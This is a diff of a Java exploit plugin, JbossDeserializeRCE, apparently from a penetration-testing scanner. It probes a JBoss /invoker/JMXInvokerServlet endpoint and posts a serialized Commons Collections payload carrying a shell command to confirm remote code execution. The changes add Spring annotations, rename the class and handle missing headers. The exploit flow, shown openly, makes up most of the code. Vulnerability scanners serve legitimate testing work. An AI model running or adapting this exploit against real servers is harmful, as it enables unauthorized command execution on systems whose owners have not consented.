@@ -17,6 +17,9 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.TransformedMap;
+import org.springframework.context.annotation.Scope;
+import org.springframework.stereotype.Component;
+
 import com.orleven.tentacle.core.IOC;
 import com.orleven.tentacle.define.Message;
 import com.orleven.tentacle.define.Permeate;
@@ -30,9 +33,11 @@ import com.orleven.tentacle.util.WebUtil;
  * @author orleven
  * @date 2017年1月5日
  */
-public class JBossDeserializeRCE  extends WebScriptBase{
+@Component
+@Scope("prototype")
+public class JbossDeserializeRCE  extends WebScriptBase{
 	
-	public JBossDeserializeRCE(){
+	public JbossDeserializeRCE(){
 		super();
 	}
 	
@@ -44,15 +49,19 @@ public class JBossDeserializeRCE  extends WebScriptBase{
 		String provePayload = "echo The JBoss Deserialize Remote Code Execution Is Exist!";
 		String result = "";
 		try {
-			result = WebUtil.getResponseAllHeaders(WebUtil.httpGet(getWebUrl()+"/invoker/JMXInvokerServlet", getHttpHeaders())).get("Content-Type");
-			if (result.indexOf("MarshalledValue") >= 0) {
+			Map<String, String>  httpHeaders = WebUtil.getResponseAllHeaders(WebUtil.httpGet(getWebUrl()+"/invoker/JMXInvokerServlet", getHttpHeaders()));
+			if(httpHeaders==null){
+				result = Message.notAvailable;
+				getVulnerBean().setIsVulner(Permeate.isNotVerified);
+			}
+			else if (httpHeaders.get("Content-Type")!=null&&httpHeaders.get("Content-Type").indexOf("MarshalledValue") >= 0) {
 				getHttpHeaders().put("Content-Type", "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue");
 				String str = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(),getHttpHeaders(), getCommandPayload(provePayload)));
 				result = str.split("==========")[1];
 				if (result!=null&&result.indexOf(proveFlag)>=0) {
 					getVulnerBean().setIsVulner(Permeate.isVulner);
 				}else{
-					getVulnerBean().setIsVulner(Permeate.isNotVerified);
+					getVulnerBean().setIsVulner(Permeate.isNotVulner);
 				}
 			}else{
 				getVulnerBean().setIsVulner(Permeate.isNotVulner);
